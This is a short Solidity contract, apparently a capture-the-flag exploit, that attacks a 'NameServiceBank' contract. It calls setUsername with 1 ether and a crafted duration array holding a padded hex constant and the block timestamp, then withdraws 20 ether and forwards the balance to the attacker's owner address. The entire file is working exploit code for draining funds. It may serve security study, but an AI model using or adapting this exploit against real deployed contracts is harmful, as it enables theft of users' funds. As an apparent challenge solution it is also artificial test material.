pragma solidity 0.7.0;

import "./NameServiceBank.sol";

contract NameServiceAttacker {
    NAME_SERVICE_BANK public target;
    address payable public owner;

    constructor(NAME_SERVICE_BANK _target) {
        target = _target;
        owner = msg.sender;
    }

    receive() external payable {}

    function attack() external payable {
        require(msg.sender == owner, "Only Owner");

        uint256[2] memory duration = [
            0x73616d637a73756e414141414141414141414141414141414141414141414141,
            block.timestamp
        ];

        target.setUsername{value: 1 ether}("", 8, duration);
        target.withdraw(20 ether);
    }

    function withdraw() external {
        require(msg.sender == owner, "Only Owner");
        owner.transfer(address(this).balance);
    }
}
